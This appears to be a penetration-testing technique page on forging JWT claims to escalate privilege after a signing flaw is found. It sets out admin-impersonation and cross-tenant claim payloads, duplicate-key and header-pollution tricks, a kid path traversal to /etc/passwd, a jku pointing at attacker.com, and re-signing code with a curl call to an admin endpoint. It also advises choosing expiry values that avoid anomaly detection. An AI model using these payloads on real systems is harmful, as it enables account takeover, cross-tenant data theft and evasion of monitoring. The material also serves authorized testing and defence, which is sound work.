# JWT — Claim Tampering / Privilege Escalation

## When this applies

- You have a valid (signed) token AND have either cracked the secret or found a way to forge new tokens.
- Goal: modify claims to impersonate a different user or escalate privilege.
- Often combined with weak-secret-crack, alg-confusion, or signature-stripping.

## Technique

Identify which claims drive authorization decisions in the application and overwrite them with admin/elevated values. The signing/verification weakness is the entry point; the claim modification is the actual privilege gain.

## Steps

### 1. Decode current token to see claim structure

```bash
python3 -c "import jwt; print(jwt.decode(open('token.txt').read().strip(), options={'verify_signature':False}))"
```

Or `echo "<payload>" | base64 -d | jq`.

### 2. Identity claims to target

```json
{
  "sub": "admin",                  // Subject — usually used for principal
  "user_id": "1",                  // Numeric ID (low IDs often = admin)
  "username": "administrator",
  "email": "admin@example.com",
  "uid": 1
}
```

### 3. Authorization claims to elevate

```json
{
  "role": "admin",
  "roles": ["admin", "superuser"],
  "permissions": ["read", "write", "delete"],
  "scope": "admin:all",
  "is_admin": true,
  "isAdmin": true,
  "admin": true,
  "privilege": 100
}
```

### 4. Temporal claims to extend session

```json
{
  "exp": 9999999999,        // Far future expiration
  "iat": 0,                 // Issued at epoch
  "nbf": 0                  // Not before — epoch
}
```

Variants if `exp` enforcement is buggy:
```json
{"exp": -1}
{"exp": "never"}
{"exp": null}
```
Or remove `exp` entirely.

### 5. Multi-tenant escalation

```json
{
  "tenant_id": "victim-tenant",
  "org_id": "victim-org",
  "company_id": "victim-co"
}
```

Switch to another tenant's identifier; if tenant binding is enforced via JWT claims only (no separate session), you read their data.

### 6. Issuer / audience spoofing

```json
{
  "iss": "https://trusted-issuer.com",
  "aud": "internal-services"
}
```

When the verifier checks `iss` / `aud` against an allowlist but doesn't verify the underlying signature properly.

### 7. Mass assignment via duplicate keys

Some JSON parsers use the LAST value when keys are duplicated:

```json
{
  "role": "user",
  "role": "admin"
}
```

Some parsers use the FIRST. Test both orderings.

### 8. Nested object override

```json
{
  "user": {"id": "123", "role": "user"},
  "role": "admin"        // Top-level override on a parser that flattens
}
```

### 9. Array manipulation

```json
{
  "roles": ["user", "admin"],
  "permissions": ["read", "write", "delete", "*"]
}
```

Wildcard `*` is sometimes interpreted as "all permissions".

### 10. Header injection (multiple `kid` values)

```json
{
  "alg": "HS256",
  "kid": "safe-key",
  "kid": "../../../etc/passwd"
}
```

Some parsers use the last `kid` — combined with kid-path-traversal becomes a chained attack.

### 11. Header parameter pollution

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {...},
  "jku": "https://attacker.com/jwks.json",
  "kid": "../../dev/null"
}
```

Throw multiple injection vectors at once; whichever the verifier honors first wins.

### 12. Sign the forged token

After modifying claims, re-sign with the recovered or controlled key:

```python
import jwt
forged = jwt.encode(modified_payload, secret, algorithm='HS256', headers=modified_header)
```

Submit:
```bash
curl -H "Authorization: Bearer $forged" https://api.example.com/admin
```

## Verifying success

- Forged token returns 200 from privileged endpoints.
- Application UI / response body reflects the elevated identity.
- API actions normally restricted (delete user, view admin panel) succeed.

## Common pitfalls

- Some apps re-validate the user identity against the database — even with a perfect token, the user_id must exist with admin role. Combine with mass-assignment / IDOR if needed.
- `exp` is usually validated; don't set absurd values that may trigger anomaly detection — `now + 1 year` is plausible, `9999999999` looks like an exploit.
- Parsers behave differently with duplicate keys — test BOTH first-wins and last-wins.
- Audit logs may catch the privilege change — note the test for the engagement timeline.
- Token rotation / refresh may invalidate the forged token after the legitimate user logs in or out.

## Tools

- jwt_tool (`-I -pc <claim> -pv <value> -S -p <secret>`).
- Burp Suite JWT Editor (manual claim modification + re-sign).
- Custom Python with PyJWT.
